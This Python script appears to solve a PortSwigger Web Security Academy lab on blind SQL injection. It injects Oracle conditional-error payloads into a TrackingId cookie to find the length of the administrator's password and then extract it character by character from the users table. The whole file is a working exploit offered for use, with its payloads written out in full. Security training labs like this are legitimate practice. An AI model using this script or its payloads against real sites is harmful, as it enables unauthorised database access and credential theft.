
import requests
import urllib3
urllib3.disable_warnings()

url = "https://0ae1009e041fb7a7c0b804c500670065.web-security-academy.net/filter?category=Toys+%26+Games"
proxy_servers = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080',
}

def check_injection(proxy_servers,url):
    query_check = "'"
    headers = {

        "Cookie": "TrackingId=pjakHuU48es9lO0F" + query_check + "; session=N3TMm45PoGw4fJ3kcgJZC0WFl9ayrrD4",
        "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0,",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "https://portswigger.net/",
        "Upgrade-Insecure-Requests": "1",
        'Sec-Fetch-Dest': "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
        "Connection": "close",

    }
    r = requests.get(url, proxies=proxy_servers, headers=headers, verify=False)
    if (r.status_code == 500):
        print("Injection detected")

    else:
        print("SQL Injection not successfull")

def get_length(proxy_servers, url):
        print("Getting password length please wait...")
        for i in range (1,26):
            query_length = "'||(SELECT CASE WHEN LENGTH(password)>"+str(i)+"THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            headers = {

                "Cookie": "TrackingId=pjakHuU48es9lO0F" + query_length + "; session=N3TMm45PoGw4fJ3kcgJZC0WFl9ayrrD4",
                "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0,",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": "https://portswigger.net/",
                "Upgrade-Insecure-Requests": "1",
                'Sec-Fetch-Dest': "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-User": "?1",
                "Te": "trailers",
                "Connection": "close",

            }


            r = requests.get(url,proxies=proxy_servers,verify=False,headers=headers)
            if(r.status_code == 200):
                print("Length of password is : "+str(i))
                break



def guess_password(proxy_server,url):
    print("Getting the value of password please wait ...")
    password = []
    wordlist = [1,2,3,4,5,6,7,8,9,0,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    for i in range(1,21):
        for j in wordlist:
            query_password_guess = "'||(SELECT CASE WHEN SUBSTR(password," + str(i) + ",1)='"+str(j)+"' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            headers = {

                "Cookie": "TrackingId=pjakHuU48es9lO0F" + query_password_guess + "; session=N3TMm45PoGw4fJ3kcgJZC0WFl9ayrrD4",
                "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0,",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": "https://portswigger.net/",
                "Upgrade-Insecure-Requests": "1",
                'Sec-Fetch-Dest': "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-User": "?1",
                "Te": "trailers",
                "Connection": "close",

            }
            r = requests.get(url, proxies=proxy_servers, headers=headers, verify=False)
            if(r.status_code == 500):
                password.append(j)
                print(str(i)+" charachter is "+ str(j))
                break


    print("The password is: ")
    for l in password:
        print(l,end="")
flag = 1

while(flag):

    a = int(input("Press 0 to exit or 1 to check for sql injection"))
    if(a==1):
        check_injection(proxy_servers,url)
        get_length(proxy_servers,url)
        guess_password(proxy_servers,url)

